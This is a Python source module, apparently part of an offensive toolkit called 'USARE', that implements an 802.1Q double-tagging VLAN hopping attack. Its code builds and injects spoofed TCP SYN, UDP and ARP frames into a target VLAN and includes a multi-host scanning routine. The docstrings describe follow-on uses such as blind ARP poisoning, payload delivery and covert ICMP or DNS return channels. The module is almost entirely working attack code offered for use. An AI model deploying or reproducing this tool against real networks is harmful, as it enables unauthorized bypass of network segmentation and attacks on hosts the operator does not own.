"""
USARE 802.1Q VLAN Double-Tagging (VLAN Hopping) Engine

VLAN hopping exploits the behaviour of 802.1Q trunk ports on misconfigured
switches. When a switch port is configured as the "native VLAN" (default: VLAN 1)
without explicit tagging, it strips the outermost 802.1Q tag from frames.

By sending frames with TWO 802.1Q tags (double-tagging):
  Outer tag: native VLAN of the trunk port (e.g. VLAN 1) — stripped by the switch
  Inner tag: target VLAN (e.g. VLAN 100)               — treated as the "real" tag

The attacking frame reaches hosts on VLAN 100 even though the attacker is
only connected to VLAN 1.

IMPORTANT LIMITATIONS:
  - Only works one-way: replies from VLAN 100 come back on VLAN 100 and
    don't reach the attacker (no path back through the native VLAN).
  - Requires the attacker to be on the native (untagged) VLAN of a trunk port.
  - The attacking system must have raw Ethernet access (no IP-only VPN).
  - Does NOT work if the switch has DTP (Dynamic Trunking Protocol) disabled
    or if the native VLAN is not the trunk native VLAN.
  - Ineffective against switches with "vlan dot1q tag native" configured.

What you CAN do with one-way VLAN hopping:
  - ARP poison VLAN 100 hosts (blind: you send, they redirect their traffic to you)
  - Inject spoofed frames onto VLAN 100
  - Probe for open ports on VLAN 100 hosts using UDP (no reply needed)
  - Deliver crafted payloads to VLAN 100 without any reply path

For two-way communication, combine with:
  - A compromised host already on VLAN 100 as a relay
  - Out-of-band covert channel (ICMP or DNS) for responses
  - The IGMP enumeration module to discover VLAN 100 hosts first

Requires: root + raw Ethernet socket (Scapy with Ethernet layer)
"""

import time
import random
import logging
import socket
import struct
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger("usare.vlan_hop")

try:
    from scapy.all import (
        Ether, Dot1Q, IP, TCP, UDP, ICMP, ARP,
        sendp, srp, conf,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


@dataclass
class VLANHopResult:
    """Result of a single VLAN-hopped probe."""
    target_ip: str
    target_port: int
    outer_vlan: int
    inner_vlan: int
    frame_sent: bool = False
    error: str = ""
    note: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "outer_vlan": self.outer_vlan,
            "inner_vlan": self.inner_vlan,
            "frame_sent": self.frame_sent,
            "note": self.note,
            "error": self.error,
        }


@dataclass
class VLANScanSummary:
    outer_vlan: int
    inner_vlan: int
    interface: str
    frames_sent: int = 0
    targets_probed: int = 0
    results: List[VLANHopResult] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "outer_vlan": self.outer_vlan,
            "inner_vlan": self.inner_vlan,
            "interface": self.interface,
            "frames_sent": self.frames_sent,
            "targets_probed": self.targets_probed,
            "note": (
                "One-way VLAN hop — frames reach VLAN target, replies do not return. "
                "Use relay or OOB channel for bidirectional communication."
            ),
        }


class VLANHopper:
    """
    802.1Q double-tagging VLAN hopping attack engine.

    Injects frames into a target VLAN by exploiting native VLAN
    misconfigurations on trunk ports.
    """

    def __init__(
        self,
        interface: str,
        outer_vlan: int = 1,
        inner_vlan: int = 100,
        src_mac: Optional[str] = None,
        src_ip: Optional[str] = None,
    ):
        """
        Args:
            interface: Local network interface connected to the trunk port.
            outer_vlan: Native VLAN of the trunk (usually VLAN 1).
                        This tag gets stripped by the upstream switch.
            inner_vlan: Target VLAN to hop into.
            src_mac: Source MAC to use (defaults to interface's actual MAC).
            src_ip: Source IP to embed in injected IP packets.
        """
        if not HAS_SCAPY:
            raise RuntimeError("Scapy is required for VLAN hopping")
        self.interface = interface
        self.outer_vlan = outer_vlan
        self.inner_vlan = inner_vlan
        self._rng = random.SystemRandom()
        conf.verb = 0

        # Resolve MAC and IP of our interface
        self.src_mac = src_mac or self._get_iface_mac(interface)
        self.src_ip = src_ip or self._get_iface_ip(interface)

    # ─── Public API ──────────────────────────────────────────────────────────

    def send_tcp_syn(self, target_ip: str, target_port: int,
                     target_mac: str = "ff:ff:ff:ff:ff:ff",
                     src_port: Optional[int] = None) -> VLANHopResult:
        """
        Inject a double-tagged TCP SYN into the target VLAN.

        Because we can't receive the SYN-ACK (one-way hop), this is used to:
          - Trigger connection state on the target (useful for timing attacks)
          - Probe for services that generate observable side-effects
          - Test if the VLAN hop works at all (monitor with tcpdump on VLAN 100)

        Args:
            target_ip: IP of the host on the target VLAN.
            target_port: Port to probe.
            target_mac: Ethernet destination (broadcast if target MAC unknown).
            src_port: Source TCP port (random if None).
        """
        sp = src_port or self._rng.randint(49152, 65535)
        result = VLANHopResult(
            target_ip=target_ip,
            target_port=target_port,
            outer_vlan=self.outer_vlan,
            inner_vlan=self.inner_vlan,
        )

        try:
            frame = self._double_tagged_frame(
                target_mac=target_mac,
                payload=(
                    IP(src=self.src_ip, dst=target_ip, ttl=64) /
                    TCP(sport=sp, dport=target_port, flags="S",
                        seq=self._rng.randint(0, 0xFFFFFFFF), window=65535)
                ),
            )
            sendp(frame, iface=self.interface, verbose=0)
            result.frame_sent = True
            result.note = (
                "SYN injected into VLAN. No reply will be received via this path. "
                "Monitor target VLAN with tcpdump to confirm delivery."
            )
            logger.info(
                f"[VLANHop] Injected SYN → {target_ip}:{target_port} "
                f"via VLAN {self.outer_vlan}→{self.inner_vlan}"
            )
        except Exception as e:
            result.error = str(e)
            logger.debug(f"[VLANHop] Frame injection failed: {e}")

        return result

    def send_udp_probe(self, target_ip: str, target_port: int,
                       payload: bytes = b"USARE",
                       target_mac: str = "ff:ff:ff:ff:ff:ff") -> VLANHopResult:
        """Inject a double-tagged UDP frame into the target VLAN."""
        result = VLANHopResult(
            target_ip=target_ip,
            target_port=target_port,
            outer_vlan=self.outer_vlan,
            inner_vlan=self.inner_vlan,
        )
        try:
            frame = self._double_tagged_frame(
                target_mac=target_mac,
                payload=(
                    IP(src=self.src_ip, dst=target_ip, ttl=64) /
                    UDP(sport=self._rng.randint(49152, 65535),
                        dport=target_port) /
                    payload
                ),
            )
            sendp(frame, iface=self.interface, verbose=0)
            result.frame_sent = True
            result.note = "UDP injected into VLAN (one-way)."
            logger.debug(f"[VLANHop] UDP injected → {target_ip}:{target_port}")
        except Exception as e:
            result.error = str(e)
        return result

    def send_arp_request(self, target_ip: str) -> VLANHopResult:
        """
        Inject an ARP request into the target VLAN to discover the target's MAC.

        ARP replies come back on VLAN 100 and won't reach us, but if you have
        a sniffer on VLAN 100 (or a relay host), you can capture the reply and
        confirm the host is alive and get its MAC for targeted injection.
        """
        result = VLANHopResult(
            target_ip=target_ip,
            target_port=0,
            outer_vlan=self.outer_vlan,
            inner_vlan=self.inner_vlan,
        )
        try:
            frame = self._double_tagged_frame(
                target_mac="ff:ff:ff:ff:ff:ff",
                ethertype_inner=0x0806,  # ARP
                payload=ARP(
                    op="who-has",
                    hwsrc=self.src_mac,
                    psrc=self.src_ip or "0.0.0.0",
                    pdst=target_ip,
                ),
            )
            sendp(frame, iface=self.interface, verbose=0)
            result.frame_sent = True
            result.note = (
                f"ARP 'who-has {target_ip}' injected into VLAN {self.inner_vlan}. "
                "ARP reply will be on that VLAN — capture with relay or promiscuous sniffer."
            )
            logger.info(f"[VLANHop] ARP who-has {target_ip} → VLAN {self.inner_vlan}")
        except Exception as e:
            result.error = str(e)
        return result

    def scan_range(self, target_ips: List[str], ports: List[int],
                   probe_type: str = "tcp") -> VLANScanSummary:
        """
        Scan multiple targets across the hopped VLAN.

        Args:
            target_ips: List of target IPs on the inner VLAN.
            ports: List of ports to probe per target.
            probe_type: "tcp" (SYN) or "udp".
        """
        summary = VLANScanSummary(
            outer_vlan=self.outer_vlan,
            inner_vlan=self.inner_vlan,
            interface=self.interface,
        )

        for target_ip in target_ips:
            for port in ports:
                if probe_type == "udp":
                    result = self.send_udp_probe(target_ip, port)
                else:
                    result = self.send_tcp_syn(target_ip, port)

                summary.results.append(result)
                summary.frames_sent += 1
                time.sleep(0.02)  # ~50 fps max injection rate

            summary.targets_probed += 1

        return summary

    def test_hop_viability(self) -> Dict[str, Any]:
        """
        Quick test to determine if the VLAN hop is likely to work.

        Checks:
          1. Can we send raw Ethernet frames? (root + correct interface)
          2. Does the interface support 802.1Q tagging?
          3. Is the outer VLAN the same as the interface's native VLAN?

        Returns diagnostic info without sending frames to the target VLAN.
        """
        diag = {
            "interface": self.interface,
            "outer_vlan": self.outer_vlan,
            "inner_vlan": self.inner_vlan,
            "src_mac": self.src_mac,
            "src_ip": self.src_ip,
            "raw_socket_available": False,
            "dot1q_supported": True,  # All modern Scapy versions support it
            "warnings": [],
            "recommendation": "",
        }

        # Check raw socket capability
        try:
            import socket
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.close()
            diag["raw_socket_available"] = True
        except (PermissionError, OSError) as e:
            diag["raw_socket_available"] = False
            diag["warnings"].append(f"Raw socket access denied: {e}. Requires root.")

        # Warn about native VLAN assumption
        if self.outer_vlan != 1:
            diag["warnings"].append(
                f"Outer VLAN {self.outer_vlan} is non-default. Ensure the trunk port's "
                f"native VLAN matches before using."
            )

        # Warn about one-way limitation
        diag["warnings"].append(
            "VLAN hopping is ONE-WAY only. Replies from the inner VLAN won't reach "
            "this host. Use a relay or out-of-band channel for bidirectional communication."
        )

        if diag["raw_socket_available"]:
            diag["recommendation"] = (
                "Ready. Run send_arp_request() first to discover target MACs, "
                "then use scan_range() for targeted injection."
            )
        else:
            diag["recommendation"] = "Requires root privileges. Re-run as root."

        return diag

    # ─── Frame Construction ──────────────────────────────────────────────────

    def _double_tagged_frame(
        self,
        target_mac: str,
        payload=None,
        ethertype_inner: int = 0x0800,  # IPv4
    ) -> Ether:
        """
        Construct a double-tagged 802.1Q frame.

        Frame structure:
          [Ether dst=target_mac src=self.src_mac type=0x8100]
          [Dot1Q vlan=outer_vlan type=0x8100]   ← outer tag (stripped by switch)
          [Dot1Q vlan=inner_vlan type=ethertype] ← inner tag (reaches target VLAN)
          [payload]
        """
        frame = (
            Ether(dst=target_mac, src=self.src_mac, type=0x8100) /
            Dot1Q(vlan=self.outer_vlan, type=0x8100) /  # outer: native VLAN, type=802.1Q
            Dot1Q(vlan=self.inner_vlan, type=ethertype_inner) /  # inner: target VLAN
            payload
        )
        return frame

    # ─── Interface Utilities ─────────────────────────────────────────────────

    @staticmethod
    def _get_iface_mac(interface: str) -> str:
        """Get the MAC address of a network interface."""
        try:
            with open(f"/sys/class/net/{interface}/address", "r") as f:
                return f.read().strip()
        except Exception:
            return "de:ad:be:ef:ca:fe"

    @staticmethod
    def _get_iface_ip(interface: str) -> str:
        """Get the primary IPv4 address of a network interface."""
        try:
            import socket
            import fcntl
            import struct
            SIOCGIFADDR = 0x8915
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            result = fcntl.ioctl(
                s.fileno(), SIOCGIFADDR,
                struct.pack("256s", interface.encode()[:15])
            )
            return socket.inet_ntoa(result[20:24])
        except Exception:
            return "10.0.0.1"
